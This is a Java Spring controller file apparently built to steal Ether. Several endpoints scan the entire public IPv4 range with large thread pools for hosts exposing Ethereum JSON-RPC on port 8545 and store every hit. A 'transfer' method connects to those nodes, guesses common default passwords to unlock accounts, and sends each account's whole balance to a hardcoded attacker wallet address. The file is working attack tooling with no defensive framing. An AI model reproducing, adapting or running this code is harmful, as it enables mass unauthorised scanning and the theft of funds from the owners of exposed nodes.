package com.warrior.controler;

import com.baomidou.mybatisplus.mapper.EntityWrapper;
import com.warrior.entity.Account;
import com.warrior.entity.Log;
import com.warrior.entity.Netseg;
import com.warrior.entity.Server;
import com.warrior.service.IAccountService;
import com.warrior.service.ILogService;
import com.warrior.service.INetsegService;
import com.warrior.service.IServerService;
import com.warrior.util.DateUtil;
import com.warrior.util.EthcoinAPI;
import com.warrior.util.HttpUtil;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.annotation.PostConstruct;
import java.math.BigDecimal;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * <p>
 * 前端控制器
 * </p>
 *
 * @author lqh
 * @since 2018-05-09
 */
@Controller
@RequestMapping("/warrior/server")
public class ServerController {

    final static Logger logger = LoggerFactory.getLogger(ServerController.class);

    final static String myAddress = "0x7828fa9e45a3b9f97a5d2d7921081def2eca7090";

    final static String[] defaulPwd = {"123456", "123456789", "12345678"};

    final static int[] interNetSeg = {10, 172, 192};

    @Autowired
    IServerService iServerService;

    @Autowired
    IAccountService iAccountService;

    @Autowired
    ILogService iLogService;

    @Autowired
    INetsegService iNetsegService;

    /**
     * 获取开启了某个端口的服务器
     */
    @RequestMapping("getCoinHost")
    @ResponseBody
    public void getCoinHost() {
        int port = 8545;
        Map interNetSegMap = new HashMap();
        for (int i = 0; i < interNetSeg.length; i++) {
            interNetSegMap.put(interNetSeg[i], interNetSeg[i]);
        }

        ExecutorService threadPool = Executors.newFixedThreadPool(100);
        for (int a = 0; a < 256; a++) {
            if (interNetSegMap.containsKey(a)) {
                continue;
            }
            if (iNetsegService.selectCount(new EntityWrapper<Netseg>().eq("net_seg", a)) != 0) {
                continue;
            }
            final int index = a;
            threadPool.execute(new Runnable() {
                @Override
                public void run() {
                    long start = System.currentTimeMillis();
                    Thread.currentThread().setName("Thread-" + index);
                    for (int b = 0; b < 256; b++) {
                        for (int c = 0; c < 256; c++) {
                            for (int d = 0; d < 256; d++) {
                                String host = index + "." + b + "." + c + "." + d;
                                logger.info("Thread[{}]-{}:{}", Thread.currentThread().getName(), host, port);
                                if (!HttpUtil.telnet(host, port)) {
                                    continue;
                                }
                                Server server = new Server()
                                        .setHost(host)
                                        .setPort(port);
                                try {
                                    logger.info("【成功连接：{}】", server);
                                    boolean res = iServerService.insert(server);
                                } catch (Exception e) {
                                    System.out.println("【insert】:" + e.getMessage());
                                }
                            }
                        }
                    }
                    logger.info("Thread[{}]-执行完毕！", Thread.currentThread().getName());
                    long end = System.currentTimeMillis();
                    Netseg netseg = new Netseg().setNetSeg(index).setStartTime(start + "").setEndTime(end + "").setUseTime((end - start) / 1000 + "");
                    iNetsegService.insert(netseg);
                }
            });
        }
        logger.info("【getCoinHost执行完毕!!!!!!!!】");
    }


    /**
     * 获取某个网段开启了某个端口的服务器
     */
    @RequestMapping("getCoinHostByNetseg")
    @ResponseBody
    public void getCoinHostByNetseg(int seg) {
        int port = 8545;
        ExecutorService threadPool = Executors.newFixedThreadPool(255);
        long start = System.currentTimeMillis();
        for (int b = 0; b < 256; b++) {
            final int index = b;
            threadPool.execute(new Runnable() {
                @Override
                public void run() {
                    Thread.currentThread().setName("Thread-" + index);
                    for (int c = 0; c < 256; c++) {
                        for (int d = 0; d < 256; d++) {
                            String host = seg + "." + index + "." + c + "." + d;
                            logger.info("Thread[{}]-{}:{}", Thread.currentThread().getName(), host, port);
                            if (!HttpUtil.telnet(host, port)) {
                                continue;
                            }
                            Server server = new Server()
                                    .setHost(host)
                                    .setPort(port);
                            try {
                                logger.info("【成功连接：{}】", server);
                                boolean res = iServerService.insert(server);
                            } catch (Exception e) {
                                System.out.println("【insert】:" + e.getMessage());
                            }
                        }
                    }

                    logger.info("Thread[{}]-执行完毕！", Thread.currentThread().getName());
                    long end = System.currentTimeMillis();
                }
            });
        }
        threadPool.shutdown();
        while (true) {
            if (threadPool.isTerminated()) {
                System.out.println("threadPool shutDown。。。");
                long end = System.currentTimeMillis();
                Netseg netseg = new Netseg().setNetSeg(seg).setStartTime(start + "").setEndTime(end + "").setUseTime((end - start) / 1000 + "");
                iNetsegService.insert(netseg);
                System.out.println("userTime:" + (end - start) / 1000);
                break;
            }
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * 遍历所有网段开启了某个端口的服务器
     */
    @RequestMapping("getCoinHostForNetseg")
    @ResponseBody
    //@PostConstruct
    public void getCoinHostForNetseg() throws InterruptedException {
        Thread.sleep(30 * 1000);
        System.out.println("=========================================自动获取IP开始了......................");
        int seg = 0;
        Netseg netseg = iNetsegService.selectOne(new EntityWrapper<Netseg>().orderBy("net_seg", false).limit(0, 1));
        if (netseg != null) {
            seg = netseg.getNetSeg();
        }
        seg++;
        if (seg == 127 || seg == 192) {
            seg++;
        }
        int port = 8545;
        ExecutorService threadPool = Executors.newFixedThreadPool(255);
        long start = System.currentTimeMillis();
        for (int i = 0; i < 256; i++) {
            final int b = i;
            final int a = seg;
            threadPool.execute(new Runnable() {
                @Override
                public void run() {
                    Thread.currentThread().setName("Thread-" + b);
                    for (int c = 0; c < 256; c++) {
                        for (int d = 0; d < 256; d++) {
                            String host = a + "." + b + "." + c + "." + d;
                            logger.info("Thread[{}]-{}:{}", Thread.currentThread().getName(), host, port);
                            if (!HttpUtil.telnet(host, port)) {
                                continue;
                            }
                            Server server = new Server()
                                    .setHost(host)
                                    .setPort(port);
                            try {
                                logger.info("【成功连接：{}】", server);
                                boolean res = iServerService.insert(server);
                            } catch (Exception e) {
                                System.out.println("【insert】:" + e.getMessage());
                            }
                        }
                    }
                    logger.info("Thread[{}]-执行完毕！", Thread.currentThread().getName());

                }
            });
        }
        threadPool.shutdown();
        while (true) {
            if (threadPool.isTerminated()) {
                System.out.println("threadPool shutDown。。。");
                long end = System.currentTimeMillis();
                netseg = new Netseg()
                        .setNetSeg(seg)
                        .setStartTime(start + "")
                        .setEndTime(end + "")
                        .setUseTime((end - start) / 1000 + "");
                iNetsegService.insert(netseg);
                //下一次
                getCoinHostForNetseg();
                break;
            }
            Thread.sleep(1000);
        }
    }


    /**
     * 监控转账
     */
    @RequestMapping("transfer")
    @ResponseBody
    public void transfer() {
        ExecutorService threadPool = Executors.newFixedThreadPool(10);
        List<Account> accountList = iAccountService.selectList(new EntityWrapper<>());
        for (Account account : accountList) {
            String address = account.getAddress();
            threadPool.execute(new Runnable() {
                @Override
                public void run() {
                    String hash = "";
                    Server server = iServerService.selectOne(new EntityWrapper<Server>().eq("id", account.getServerId()));
                    if (HttpUtil.telnet(server.getHost(), server.getPort())) {
                        EthcoinAPI eth = new EthcoinAPI(account.getUser(), account.getPwd(), server.getHost(), server.getPort().toString(), account.getAccountPwd());
                        BigDecimal balance = eth.getBalance(address);
                        BigDecimal minerFee = eth.getMinerFee();
                        BigDecimal availableBlance = balance.subtract(minerFee);
                        if (availableBlance.compareTo(BigDecimal.ZERO) == 1) {
                            int count = 3;
                            while (count > 0) {
                                count--;
                                hash = eth.sendTransaction(address, myAddress, EthcoinAPI.unit10To16(availableBlance));
                                if (hash.equals("")) {
                                    for (int i = 0; i < defaulPwd.length; i++) {
                                        if (eth.unlockAccount(address, defaulPwd[i])) {
                                            break;
                                        }
                                    }
                                    hash = eth.sendTransaction(address, myAddress, EthcoinAPI.unit10To16(availableBlance));
                                }
                                if (!hash.equals("")) {
                                    logger.info("【成功从{}向{}转账{}ETH】", address, myAddress, availableBlance.divide(EthcoinAPI.WEI));
                                    Log log = new Log().setLogName("【transferSuccess】").setLogContent("from:" + address + ",to:" + myAddress + ",value:" + availableBlance + ",hash:" + hash)
                                            .setDate(new Date(DateUtil.getCurTime()));
                                    iLogService.insert(log);
                                    break;
                                }
                            }
                        } else {
                            logger.info("【{}余额不足】", address);
                        }
                    } else {
                        logger.info("telnet fail");
                    }
                }
            });
        }
    }


}
